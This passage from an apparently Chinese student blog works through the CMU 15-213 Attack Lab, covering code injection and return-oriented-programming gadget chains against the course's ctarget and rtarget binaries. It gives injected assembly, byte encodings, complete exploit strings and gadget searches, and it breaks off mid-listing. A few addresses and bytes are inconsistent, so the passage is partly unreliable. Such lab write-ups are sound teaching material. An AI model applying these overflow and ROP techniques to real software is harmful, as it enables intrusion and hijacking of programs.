retq\n</code></pre>\n<p>由于<code>hexmatch</code>和<code>strncmp</code>是在<code>touch3</code>里面调用的，而<code>touch3</code>是在执行攻击代码之后调用，在攻击代码中我们将<code>%rdi</code>指向字符串的地址，因此我们需要保证的是<code>touch3</code>中的<code>push</code>和<code>pop</code>指令不影响之前的字符串，以免影响<code>%rdi</code>指向的值。</p>\n<p>在调用<code>touch3</code>之前，我们刚刚执行了<code>ret</code>指令，其作用是将返回地址赋值给<code>%rip</code>并弹出，操作完成后<code>%rsp</code>应该在<code>buf + 48</code>位置处。我们是通过直接返回到<code>touch3</code>的开头位置来执行<code>touch3</code>的，而不是<code>callq touch3</code>，因此无需往栈中压入下一条指令的地址（当然这里也没有下一条啦~）</p>\n<p>通过上述过程分析我们可以看到，栈的最低位置应该是在经过了一下几个步骤之后：</p>\n<ol>\n<li><code>push %rbx</code>，这里压入了 rbx，栈位置来到了<code>buf + 40</code></li>\n<li><code>callq hex2match</code>，这里压入了<code>callq</code>的下一条指令的地址，栈位置来到了<code>buf + 32</code></li>\n<li><code>push r12</code>，压入了<code>r12</code>，栈位置来到了<code>buf + 24</code></li>\n<li><code>push rbp</code>，压入了<code>rbp</code>，栈位置来到了<code>buf + 16</code></li>\n<li><code>push rbx</code>，压入了<code>rbx</code>，栈位置来到了<code>buf + 8</code></li>\n</ol>\n<p>后续主要执行的都是<code>pop</code>和<code>retq</code>操作，虽然有一个<code>callq strncmp</code>，但是栈的位置不可能低于<code>buf + 8</code>。因此我们插入的字符串必须在<code>buf + 8</code>之前。我们输入的字符串刚好是 8 个字符，1 个字符一个字节，也刚好是 8 个字节，那么就应当插在<code>buf</code>处。从<code>buf + 8</code>处开始插入攻击代码。</p>\n<p>此外：</p>\n<ol>\n<li><code>59b997fa</code>的字符串编码应该是：<code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61</code>（插在攻击代码前）</li>\n<li><code>buf + 8</code>处的地址是：<code>0x5561dc80</code>（插入返回地址部分），转化成小端法应该是<code>80 dc 61 55</code></li>\n<li><code>touch3</code>的地址是<code>0x4018fa</code></li>\n</ol>\n<p>那么我们的攻击指令应该是：</p>\n<pre><code>movl $0x5561dc78,%edi\nsubq $0x8,%rsp\nmovl $0x4018fa,(%rsp)\nret\n</code></pre>\n<p>将其放入<code>ph3.s</code>中，输入<code>gcc -c ph3.s</code>得到<code>ph3.o</code>，输入<code>objdump -d ph3.o &gt; ph3.d</code>，得到<code>ph3.d</code>文件如下：</p>\n<pre><code>\nph3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\tbf 78 dc 61 55       \tmov    $0x5561dc78,%edi\n   5:\t48 83 ec 08          \tsub    $0x8,%rsp\n   9:\tc7 04 24 fa 18 40 00 \tmovl   $0x4018fa,(%rsp)\n  10:\tc3                   \tretq\n  11:\t90                   \tnop\n  12:\t90                   \tnop\n  13:\t90                   \tnop\n  14:\t90                   \tnop\n</code></pre>\n<p>那么其字节应该是<code>bf 78 dc 61 55 48 83 ec 08 c7 04 24 fa 18 40 00 c3</code>。一共 17 个字节，加上最前面 8 个字节，一共 25 个字节。最后插入 15 个字节的<code>nop</code>。<br>执行过程中内存情况如下：</p>\n<pre><code>(gdb) x/48xb 0x5561dc78\n0x5561dc78:     0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61\n0x5561dc80:     0xbf    0x78    0xdc    0x61    0x55    0x48    0x83    0xec\n0x5561dc88:     0x08    0xc7    0x04    0x24    0xfa    0x18    0x40    0x00\n0x5561dc90:     0xc3    0x90    0x90    0x90    0x90    0x90    0x90    0x90\n0x5561dc98:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90\n0x5561dca0:     0x80    0xdc    0x61    0x55    0x00    0x00    0x00    0x00\n</code></pre>\n<p>而这里我们打印值后发现我们的<code>%edi</code>所指向的字符串如下：</p>\n<pre><code>(gdb) x/s $rdi\n0x5561dc78:     &quot;59b997fa\\277x\\334aUH\\203\\354\\b\\307\\004$\\372\\030@&quot;\n</code></pre>\n<p>而<code>cookie</code>的值如下：</p>\n<pre><code>(gdb) p /x cookie\n$14 = 0x59b997fa\n</code></pre>\n<p>但是后来这个<code>buf</code>的空间就变成了这样：</p>\n<pre><code>5: x/48xb 0x5561dc78\n0x5561dc78:     0x00    0x2e    0x40    0xcb    0xed    0x3e    0x25    0xb2\n0x5561dc80:     0x78    0xdc    0x61    0x55    0x00    0x00    0x00    0x00\n0x5561dc88:     0xe8    0x5f    0x68    0x55    0x00    0x00    0x00    0x00\n0x5561dc90:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x5561dc98:     0x16    0x19    0x40    0x00    0x00    0x00    0x00    0x00\n0x5561dca0:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00\n</code></pre>\n<p>但是我们后来发现，这里栈的内容被完全改变了，而且字符串的后面忘了加<code>\\0</code>字符。所以这里是有一些问题的。</p>\n<h4 id=\"正确的解答\"><a href=\"#正确的解答\" class=\"headerlink\" title=\"正确的解答\"></a>正确的解答</h4><p>经过查阅一些<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MDcyNDk0OA==\">网上的资料</span>发现，我在阅读 C 语言代码的时候忽略了这 2 行：</p>\n<pre><code class=\"c\">char cbuf[110];\n/* Make position of check string unpredictable */\nchar *s = cbuf + random() % 100;\n</code></pre>\n<p>那么<code>hexmatch</code>和<code>strncmp</code>中分配的空间就是随机的。那么我们所做出的改变应该是让插入的字符串放在父函数<code>test</code>的位置，然后让<code>%rdi</code>指向<code>test</code>栈空间中的位置。<code>test</code>函数的位置在返回地址下面，那么应该是<code>buf + 48</code>即<code>0x5561dca8</code>。其字符<code>bf 78 dc 61 55 48 83 ec 00</code>应该在返回地址后面。而攻击代码也应该改为：</p>\n<pre><code>movl $0x5561dca8,%edi\nsubq $0x8,%rsp\nmovl $0x4018fa,(%rsp)\nret\n</code></pre>\n<p>中间两行代码可以改为<code>pushq $0x4018fa</code>。由此，我们在<code>ph3.s</code>中放入如下内容：</p>\n<pre><code>movl $0x5561dca8,%edi\npushq $0x4018fa\nret\n</code></pre>\n<p>后续步骤和前述一样，我们生成其汇编代码：</p>\n<pre><code>\nph3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\tbf a0 dc 61 55       \tmov    $0x5561dca8,%edi\n   5:\t68 fa 18 40 00       \tpushq  $0x4018fa\n   a:\tc3                   \tretq\n   b:\t90                   \tnop\n   c:\t90                   \tnop\n   d:\t90                   \tnop\n   e:\t90                   \tnop\n</code></pre>\n<p>这次我们不把汇编代码插入<code>buf + 8</code>了，因为没有意义，我们直接将其插入汇编代码开头即可。最后的 8 个字节返回地址改为<code>0x5561dc78</code>。其前面的内容为<code>bf a0 dc 61 55 68 fa 18 40 00 c3</code>，共 11 个字节。插入 29 个<code>nop</code>(0x90)。在插入 8 个字节的返回地址（<code>0x000000005561dc78</code>）。最后放入 9 个字节的字符串<code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00</code>。最后结果如下：</p>\n<pre><code class=\"bash\">Cookie: 0x59b997fa\nType string:Touch3!: You called touch3(&quot;59b997fa&quot;)\nValid solution for level 3 with target ctarget\nPASS: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:PASS:0xffffffff:ctarget:3:BF A8 DC 61 55 68 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00\n</code></pre>\n<p>通过！</p>\n<h2 id=\"Part-II-Return-oriented-Programming-attack\"><a href=\"#Part-II-Return-oriented-Programming-attack\" class=\"headerlink\" title=\"Part II: Return oriented Programming attack\"></a>Part II: Return oriented Programming attack</h2><p><code>rtarget</code>的攻击要比<code>ctarget</code>难一些，因为：</p>\n<ol>\n<li>开启了栈随机化，程序的地址难以预测</li>\n<li>开启了 Non-executable 位，导致我们插入的代码部分难以执行</li>\n</ol>\n<p>因此，我们使用一种新的方法：return oriented programming attacks。它的核心在于利用已有的程序，而不是注入代码。每个 gadget 是一个代码段，每个 gadget 的最后都是<code>ret</code>指令（编码<code>c3</code>），将这个自己和其前面的部分字节组合起来，可以合成我们想要的指令。此外，针对 x86_64，我们不一定要利用整条指令，有的时候一条指令的一部分字节又可以组成另一条指令。所有 gadget 的地址被压在栈上，每次调用<code>ret</code>之后就会返回到下一个 gadget 的地址。</p>\n<h3 id=\"Phase-4\"><a href=\"#Phase-4\" class=\"headerlink\" title=\"Phase 4\"></a>Phase 4</h3><p>利用<code>rop</code>重做 Phase 2 的实验，可以使用<code>movq, popq, ret, nop</code>指令以及前 8 个寄存器(<code>%rax–%rdi</code>)<br>提示：</p>\n<ol>\n<li>可以在<code>start_farm</code>和<code>mid_farm</code>之间寻找 gadget</li>\n<li>可以只使用 2 个 gadget</li>\n<li>当一个 gadget 使用<code>popq</code>指令时，它从栈上弹出一个数值，所以你的攻击字符串可以是 gadget 地址和数值的组合。</li>\n</ol>\n<p>Phase 2 的目的是让<code>test()</code>跳转到<code>touch2</code>函数，并且需要让<code>%edi</code>的值等于<code>cookie</code>的值。</p>\n<p>我们当时做题的主要过程是：</p>\n<ol>\n<li>让最后的转移地址为<code>buf</code>开头的位置(<code>0x5561dc78</code>)</li>\n<li>在<code>buf</code>中存储攻击指令<ol>\n<li>让<code>%edi = *0x6054e4</code></li>\n<li>将<code>touch2</code>的地址压入栈中，<code>pushq 0x4017ec</code></li>\n</ol>\n</li>\n<li>调用<code>ret</code>返回</li>\n</ol>\n<p>我们在 phase 2 中需要插入的代码是：</p>\n<pre><code>    movq $0x6054e4,%rax\n    movq (%rax),%rdi\n    subq $0x8,%rsp\n    movq $0x4017ec,(%rsp)\n    ret\n</code></pre>\n<p>这里的变化在于，我们不需要使用<code>buf</code>来存储攻击指令了，而是在整个程序中寻找攻击指令。把第一个 gadget 的地址放在返回地址处，把第二个 gadget 的地址放在第一个 gadget 后面。以此类推。我们的目的是找到所有的 gadget。</p>\n<p>但是其实这段代码可以通过把<code>0x6054e4</code>和<code>0x6017ec</code>两个值压在栈上。首先利用一个<code>popq</code>指令将其弹出到<code>%rax</code>中，然后将<code>%rax</code>处的值移动到<code>%rdi</code>上。我们可以这样设计栈帧：</p>\n<p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame.png\" alt=\"frame.png\"></p>\n<p>第一个<code>gadget</code>中的代码是：</p>\n<pre><code>movq %rsp, %rxx\npopq %rax\nmovq (%rax),%rdi\n</code></pre>\n<p>第二个<code>gadget</code>中的代码是：</p>\n<pre><code>popq %rax\nmovq %rax,(%rxx)\n</code></pre>\n<p>使用<code>popq %rax</code>是因为，<code>popq</code>有 8 种可能的结果，而只有<code>popq %rax</code>出现在代码的字节中，因此我们从这里出发。我们翻译一下<code>movq (%rax),%rdi</code>，其字节编码为<code>48 8b 38</code>。</p>\n<p>但是我们发现其实不用那么麻烦，也就是说不用保存之前的<code>%rsp</code>，这是因为我们可以通过<code>gadget</code>中的<code>ret</code>指令弹出后 8 个字节的地址并且首先跳转，那么就无需把<code>touch3</code>的地址保存在最开始的部分。栈空间可以简化成如下情况：</p>\n<p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame1.png\" alt=\"frame1.png\"></p>\n<p>但是我们发现一个问题，就是<code>movq (%rax),%rdi</code>这条指令所对应的字节在源程序中找不到，因此我们需要采取一个更加优化的办法，就是不在栈上保存<code>cookie</code>的地址，而是直接保存<code>cookie</code>的值，<code>cookie</code>的值为<code>0x59b997fa</code>，那么栈空间可以简化成如下情况：</p>\n<p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame3.png\" alt=\"frame3.png\"></p>\n<p>这样只需要两条指令就可以做到了。这两条指令的编码是</p>\n<pre><code>\ngadget.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\t58                   \tpop    %rax\n   1:\t48 89 c7             \tmov    %rax,%rdi\n</code></pre>\n<p>但是这两条指令我们无法在同一处找到，因此需要划分为 2 个<code>gadget</code>。且两条后面的都必须接数个<code>90</code>（<code>nop</code>）加上一个<code>c3</code>。</p>\n<p>第一个的地址是<code>4019ab</code>或<code>4019cc</code>。第二个的地址是<code>4019a2</code>或者<code>4019c5</code>。</p>\n<p>我们这里使用<code>4019ab</code>和<code>4019a2</code>两个<code>gadget</code>。第一个中存储<code>pop %rax</code>指令，第二个中存储<code>mov %rax, %rdi</code>指令。最后的栈空间如下：</p>\n<p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame-last.png\" alt=\"frame-last.png\"></p>\n<p>由此，输入的攻击字符串的前 40 个字节随意，后面 32 个字节根据上述栈情况为（注意应该用小端法）</p>\n<pre><code>ab 19 40 00 00 00 00 00\nfa 97 b9 59 00 00 00 00\na2 19 40 00 00 00 00 00\nec 17 40 00 00 00 00 00\n</code></pre>\n<blockquote>\n<p>刚刚差点把 gadget1 和 2 的地址搞反了，导致跑出来 segmentation fault，还疑惑是怎么回事，后来一看发现不好，哈哈哈哈，做题的时候还是要认真仔细嗷！</p>\n</blockquote>\n<p>输入<code>./hex2raw &lt; phase4.txt | ./rtarget -q</code>（注意不要输入成<code>ctarget</code>啦！），运行结果如下：</p>\n<pre><code class=\"bash\">gwen@gwen-virtual-machine:~/Documents/report/code/15213/lab/lab3-attack-lab$ ./hex2raw &lt; phase4.txt | ./rtarget -q\nCookie: 0x59b997fa\nType string:Touch2!: You called touch2(0x59b997fa)\nValid solution for level 2 with target rtarget\nPASS: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00\n</code></pre>\n<h3 id=\"Phase-5\"><a href=\"#Phase-5\" class=\"headerlink\" title=\"Phase 5\"></a>Phase 5</h3><p>phase 5 的任务是让<code>%rdi</code>指向<code>cookie</code>的字符串表示并调用<code>touch 3</code>，这个任务看起来有点类似我们在 Phase 3 中做的工作。</p>\n<p>作者提示：</p>\n<ol>\n<li>可使用的<code>gadget</code>的范围是<code>start_farm</code>到<code>end_farm</code></li>\n<li>利用 Appendix 中的表</li>\n<li>复习一下课本 P83 的<code>movl</code>的用法</li>\n<li>官方答案使用了 8 个 gadget</li>\n</ol>\n<p>在 Phase 3 中我们所做的工作是：</p>\n<ol>\n<li>插入攻击字符串在攻击代码前</li>\n<li>在返回地址处插入攻击代码的起始位置</li>\n<li>在攻击代码中实现如下操作：<ol>\n<li>将攻击字符串的地址赋值给<code>%rdi</code></li>\n<li>将<code>touch3</code>的返回地址压入返回地址处</li>\n</ol>\n</li>\n</ol>\n<p>现在使用<code>rop</code>后的问题在于：攻击字符串压到哪？现在栈上是返回地址和字符串的组合。那么我们的想法是让攻击字符串放在所有 gadget 地址之后。但是具体放在之后多少呢？这要看<code>mov xxx, %rdi</code>中哪些地址的编码存在。</p>\n<p>首先，<code>cookie</code>的值是<code>59b997fa</code>，那么其字符串编码是<code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00</code>(<code>0x00</code>是字符串最后的<code>\\0</code>)。那么我们构建的<code>gadget</code>中应有的步骤是：</p>\n<ol>\n<li><code>mov 地址,%rdi</code></li>\n<li><code>ret</code></li>\n</ol>\n<p>此外，<code>touch3</code>的地址是<code>0x4018fa</code>。那么我们最初设计的栈空间如图：</p>\n<p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/phase5.png\" alt=\"phase5.png\"></p>\n<p>但是我后来有点卡壳了，问题在于把字符串存在什么位置呢？如果存在那个位置，在<code>rtarget</code>汇编中能找到对应的<code>gadget</code>吗？于是我查找了<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTA0MTgwNTM=\">一点资料</span>(有点耍赖了对不起对不起~)，这个资料中提到的一条信息是我没有想到的：</p>\n<blockquote>\n<p>rtarget 相比 ctarget 的区别在于开启了栈随机化。也就是运行时字符串的地址是不确定的。在 phase 3 中我们所做的工作是刚好将其压在<code>test</code>函数的返回地址下面，但是这里我们需要其相对与栈顶的地址。</p>\n</blockquote>\n<p>因此，我们应该做的步骤是：</p>\n<pre><code>1. 将攻击字符串放在%rsp + offset 处\n2. 让 %rdi = %rsp + offset\n3. ret\n</code></pre>\n<p>那么如何计算这个地址，并且将其赋给<code>%rdi</code>呢？这个地址的计算需要在<code>%rsp</code>的基础上偏移几十个字节。地址的计算我们可以使用<code>lea</code>指令，然而加法运算如何实现呢？我们看看代码中有没有提供：</p>\n<pre><code class=\"c\">/* Add two arguments */\nlong add_xy(long x, long y)\n&#123;\n    return x+y;\n&#125;\n</code></pre>\n<p>这段代码的汇编格式如下：</p>\n<pre><code>00000000004019d6 &lt;add_xy&gt;:\n  4019d6:\t48 8d 04 37          \tlea    (%rdi,%rsi,1),%rax\n  4019da:\tc3                   \tretq\n</code></pre>\n<p>其把<code>%rdi</code>和<code>%rsi</code>累加到<code>%rax</code>中，那么我们要计算偏移量，需要分别把<code>%rsp</code>和偏移量放到<code>%rsi</code>和<code>%rdi</code>中。最后让<code>%rdi = rax</code>。</p>\n<p>在<code>rtarget</code>中，与<code>%rsp</code>相关的字节有<code>48 89 e0</code>，其编码为<code>movq %rsp,%rax</code>。和<code>%esp</code>相关的字节有<code>89 e0</code>，其编码为<code>movl %esp, %eax</code>。包含这段编码的代码如下：</p>\n<pre><code>0000000000401a03 &lt;addval_190&gt;:\n  401a03:\t8d 87 41 48 89 e0    \tlea    -0x1f76b7bf(%rdi),%eax\n  401a09:\tc3                   \tretq\n\n0000000000401a18 &lt;getval_345&gt;: // 不可取，c1不是单独指令\n  401a18:\tb8 48 89 e0 c1       \tmov    $0xc1e08948,%eax\n  401a1d:\tc3                   \tretq\n\n0000000000401a39 &lt;addval_110&gt;:\n  401a39:\t8d 87 c8 89 e0 c3    \tlea    -0x3c1f7638(%rdi),%eax\n  401a3f:\tc3                   \tretq\n\n0000000000401a47 &lt;addval_201&gt;: // 不可取，c7不是单独指令\n  401a47:\t8d 87 48 89 e0 c7    \tlea    -0x381f76b8(%rdi),%eax\n  401a4d:\tc3                   \tretq\n\n0000000000401a5a &lt;setval_299&gt;: // 不可取，91不是单独指令\n  401a5a:\tc7 07 48 89 e0 91    \tmovl   $0x91e08948,(%rdi)\n  401a60:\tc3                   \tretq\n\n0000000000401a83 &lt;addval_358&gt;:\n  401a83:\t8d 87 08 89 e0 90    \tlea    -0x6f1f76f8(%rdi),%eax\n  401a89:\tc3                   \tretq\n\n0000000000401a97 &lt;setval_181&gt;: // 不可取，c2不是单独指令\n  401a97:\tc7 07 48 89 e0 c2    \tmovl   $0xc2e08948,(%rdi)\n  401a9d:\tc3                   \tretq\n\n0000000000401aab &lt;setval_350&gt;:\n  401aab:\tc7 07 48 89 e0 90    \tmovl   $0x90e08948,(%rdi)\n  401ab1:\tc3                   \tretq\n</code></pre>\n<p>那么之前的过程就变为：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. rsi = 偏移量\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>我们找一下以<code>%rsi</code>和<code>%rdi</code>为目的寄存器的指令。</p>\n<p>以<code>%rdi</code>为目的寄存器的指令编码有<code>(48)* 89 (c|d|e|f)(7|f)</code>，在<code>rtarget</code>中可能的代码段如下：</p>\n<pre><code>00000000004019a0 &lt;addval_273&gt;: // 不可取，c3不是指令\n  4019a0:\t8d 87 48 89 c7 c3    \tlea    -0x3c3876b8(%rdi),%eax\n  4019a6:\tc3                   \tretq\n\n00000000004019ae &lt;setval_237&gt;: // 不可取，c7不是指令\n  4019ae:\tc7 07 48 89 c7 c7    \tmovl   $0xc7c78948,(%rdi)\n  4019b4:\tc3                   \tretq\n\n00000000004019c3 &lt;setval_426&gt;: // 是他！是他！就是他！\n  4019c3:\tc7 07 48 89 c7 90    \tmovl   $0x90c78948,(%rdi)\n  4019c9:\tc3                   \tretq\n</code></pre>\n<p>以<code>%rsi/%esi</code>为目的寄存器的指令编码有<code>(48)* 89 (c|d|e|f)(6|e)</code>。在<code>rtarget</code>中可能的代码段如下：</p>\n<pre><code>00000000004019e8 &lt;addval_113&gt;: // 不可取，78 c9不是指令\n  4019e8:\t8d 87 89 ce 78 c9    \tlea    -0x36873177(%rdi),%eax\n  4019ee:\tc3                   \tretq\n\n0000000000401a11 &lt;addval_436&gt;: // 可以是他！\n  401a11:\t8d 87 89 ce 90 90    \tlea    -0x6f6f3177(%rdi),%eax\n  401a17:\tc3                   \tretq\n\n0000000000401a25 &lt;addval_187&gt;: // 可以是他，38 c0 是cmpb %al指令，不影响结果\n  401a25:\t8d 87 89 ce 38 c0    \tlea    -0x3fc73177(%rdi),%eax\n  401a2b:\tc3                   \tretq\n\n0000000000401a61 &lt;addval_404&gt;: // 不可取，92 c3不是指令\n  401a61:\t8d 87 89 ce 92 c3    \tlea    -0x3c6d3177(%rdi),%eax\n  401a67:\tc3                   \tretq\n</code></pre>\n<p>这里没有<code>48</code>，那么就只能输送到<code>%esi</code>中。这里的难点在于如何把偏移量输送到<code>%esi</code>中？这里肯定是不能直接输送了，必须通过寄存器的中转。这里只出现了<code>89 ce</code>，通过查表我们可以发现<code>89 ce</code>对应的指令是<code>movl %ecx, %esi</code>。那么我们还需要想办法把值送到<code>%ecx</code>中。那么前面的过程就变成了：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. ecx = 偏移量； rsi = ecx(89 ce)\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>我们再来探测一下目的寄存器为<code>%ecx</code>的相关指令，其格式为<code>(48)* 89 (c|d|e|f)(1|9)</code>，包含其格式的代码段为：</p>\n<pre><code>00000000004019f6 &lt;getval_226&gt;: // 不可取，48 c0不是指令\n  4019f6:\tb8 89 d1 48 c0       \tmov    $0xc048d189,%eax\n  4019fb:\tc3                   \tretq\n0000000000401a33 &lt;getval_159&gt;: // 可取，38 c9 是cmpb %cl指令\n  401a33:\tb8 89 d1 38 c9       \tmov    $0xc938d189,%eax\n  401a38:\tc3                   \tretq\n0000000000401a68 &lt;getval_311&gt;: // 可取，08 db 是orb %bl指令\n  401a68:\tb8 89 d1 08 db       \tmov    $0xdb08d189,%eax\n  401a6d:\tc3                   \tretq\n0000000000401a6e &lt;setval_167&gt;: // 不可取，91 c3 不是指令\n  401a6e:\tc7 07 89 d1 91 c3    \tmovl   $0xc391d189,(%rdi)\n  401a74:\tc3                   \tretq\n</code></pre>\n<p>代码段中以<code>%ecx</code>为目的寄存器的代码格式为<code>89 d1</code>，其转化为指令为<code>movl %edx, %ecx</code>。</p>\n<p>那么前面的过程就变成了：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. edx = 偏移量； ecx = edx；(89 d1) rsi = ecx(89 ce)\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>我们再来探测一下目的寄存器为<code>%edx</code>的相关指令，其格式为<code>(48)* 89 (c|d|e|f)(2|a)</code>，包含其格式的代码段为：</p>\n<pre><code>00000000004019db &lt;getval_481&gt;: // 可以是他！\n  4019db:\tb8 5c 89 c2 90       \tmov    $0x90c2895c,%eax\n  4019e0:\tc3                   \tretq\n0000000000401a1e &lt;addval_479&gt;: // 不可以是他！\n  401a1e:\t8d 87 89 c2 00 c9    \tlea    -0x36ff3d77(%rdi),%eax\n  401a24:\tc3                   \tretq\n0000000000401a40 &lt;addval_487&gt;: // 可以是他，84 c0是 testb %al\n  401a40:\t8d 87 89 c2 84 c0    \tlea    -0x3f7b3d77(%rdi),%eax\n  401a46:\tc3                   \tretq\n0000000000401a54 &lt;getval_155&gt;: // 不可以是他，c4 c9不是指令\n  401a54:\tb8 89 c2 c4 c9       \tmov    $0xc9c4c289,%eax\n  401a59:\tc3                   \tretq\n0000000000401a8a &lt;addval_124&gt;: // 不可以是他，c7 37不是指令\n  401a8a:\t8d 87 89 c2 c7 3c    \tlea    0x3cc7c289(%rdi),%eax\n  401a90:\tc3                   \tretq\n0000000000401a9e &lt;addval_184&gt;: // 不可以是他，60 d2不是指令\n  401a9e:\t8d 87 89 c2 60 d2    \tlea    -0x2d9f3d77(%rdi),%eax\n  401aa4:\tc3                   \tretq\n</code></pre>\n<p>代码段中以<code>%edx</code>为目的寄存器的代码格式为<code>89 c2</code>，其转化为指令为<code>movl %eax, %edx</code>。</p>\n<p>那么前面的过程就变成了：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. eax = 偏移量；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>以<code>%eax</code>(或<code>%rax</code>)为目的寄存器的指令格式为<code>(48)* 89 (c|d|e|f)(0|8)</code>，包含其格式的代码段为：</p>\n<pre><code>0000000000401a03 &lt;addval_190&gt;:\n  401a03:\t8d 87 41 48 89 e0    \tlea    -0x1f76b7bf(%rdi),%eax\n  401a09:\tc3                   \tretq\n0000000000401a18 &lt;getval_345&gt;:\n  401a18:\tb8 48 89 e0 c1       \tmov    $0xc1e08948,%eax\n  401a1d:\tc3                   \tretq\n0000000000401a39 &lt;addval_110&gt;:\n  401a39:\t8d 87 c8 89 e0 c3    \tlea    -0x3c1f7638(%rdi),%eax\n  401a3f:\tc3                   \tretq\n0000000000401a47 &lt;addval_201&gt;:\n  401a47:\t8d 87 48 89 e0 c7    \tlea    -0x381f76b8(%rdi),%eax\n  401a4d:\tc3                   \tretq\n0000000000401a5a &lt;setval_299&gt;:\n  401a5a:\tc7 07 48 89 e0 91    \tmovl   $0x91e08948,(%rdi)\n  401a60:\tc3                   \tretq\n0000000000401a83 &lt;addval_358&gt;:\n  401a83:\t8d 87 08 89 e0 90    \tlea    -0x6f1f76f8(%rdi),%eax\n  401a89:\tc3                   \tretq\n0000000000401a97 &lt;setval_181&gt;:\n  401a97:\tc7 07 48 89 e0 c2    \tmovl   $0xc2e08948,(%rdi)\n  401a9d:\tc3                   \tretq\n0000000000401aab &lt;setval_350&gt;:\n  401aab:\tc7 07 48 89 e0 90    \tmovl   $0x90e08948,(%rdi)\n  401ab1:\tc3                   \tretq\n</code></pre>\n<p>其中以<code>%eax</code>为目的寄存器的代码格式为<code>89 e0</code>，其主要目的为<code>movl %esp,%eax</code>，也就是我们步骤第一步中的内容。</p>\n<p>除此以外，还有一种涉及<code>%rax</code>的指令就是<code>popq %rax</code>，其指令编码为<code>58</code>。其在代码中出现的部分包含：</p>\n<pre><code>00000000004019a7 &lt;addval_219&gt;: // 可以是他！\n  4019a7:\t8d 87 51 73 58 90    \tlea    -0x6fa78caf(%rdi),%eax\n  4019ad:\tc3                   \tretq\n00000000004019b5 &lt;setval_424&gt;: // 92不是指令，不可以是他！\n  4019b5:\tc7 07 54 c2 58 92    \tmovl   $0x9258c254,(%rdi)\n  4019bb:\tc3                   \tretq\n00000000004019ca &lt;getval_280&gt;: // c3不是指令，不可以是他！\n  4019ca:\tb8 29 58 90 c3       \tmov    $0xc3905829,%eax\n  4019cf:\tc3                   